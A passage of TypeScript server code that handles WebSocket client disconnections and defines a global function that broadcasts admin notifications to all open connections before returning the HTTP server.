      console.log('WebSocket client disconnected');
      const index = connections.indexOf(ws);
      if (index !== -1) {
        connections.splice(index, 1);
      }
    });
  });
  
  // Function to broadcast admin notifications
  (global as any).broadcastAdminNotification = (message: string) => {
    connections.forEach(client => {
      if (client.readyState === 1) { // OPEN
        client.send(JSON.stringify({ type: 'admin_notification', message }));
      }
    });
  };
  
  return httpServer;
}
